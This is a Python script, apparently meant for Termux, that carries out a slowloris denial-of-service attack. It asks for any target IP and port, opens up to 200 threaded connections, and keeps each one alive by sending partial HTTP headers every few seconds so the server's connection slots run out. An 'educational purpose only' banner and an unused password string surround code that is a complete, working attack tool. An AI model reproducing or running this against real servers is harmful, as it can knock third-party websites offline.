#!/usr/bin/env python3

"""
AURA SLOWLORIS SIMULATOR
⚠️ EDUCATIONAL PURPOSE ONLY - Test YOUR own web server only ⚠️
Keeps connections open slowly to exhaust server resources
Password: AuraV6
"""

import socket
import threading
import time
import sys

print("╔══════════════════════════════════════════════════════════════╗")
print("║              🔥 AURA SLOWLORIS SIMULATOR 🔥                  ║")
print("║           ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️                    ║")
print("╚══════════════════════════════════════════════════════════════╝")
print("")

target_ip = input("Enter target IP (YOUR own web server): ")
target_port = int(input("Enter target port (usually 80): "))
connections = int(input("Enter number of connections to open (1-200): "))

if connections > 200:
    connections = 200

print(f"\n🐌 Opening {connections} slow connections to {target_ip}:{target_port}...")

def slowloris_connect():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        
        # Send incomplete HTTP request
        sock.send(b"GET / HTTP/1.1\r\n")
        sock.send(b"Host: target\r\n")
        sock.send(b"User-Agent: AuraSlowloris\r\n")
        
        # Keep sending partial headers to keep connection alive
        while True:
            sock.send(b"X-Header: keep-alive\r\n")
            time.sleep(5)
    except:
        pass

# Start connections
for i in range(connections):
    thread = threading.Thread(target=slowloris_connect)
    thread.daemon = True
    thread.start()
    print(f"✓ Connection {i+1} opened")
    time.sleep(0.1)

print(f"\n✅ {connections} slow connections established")
print("⚠️ Connections will stay open until you restart Termux")
print("🔐 Password: AuraV6")
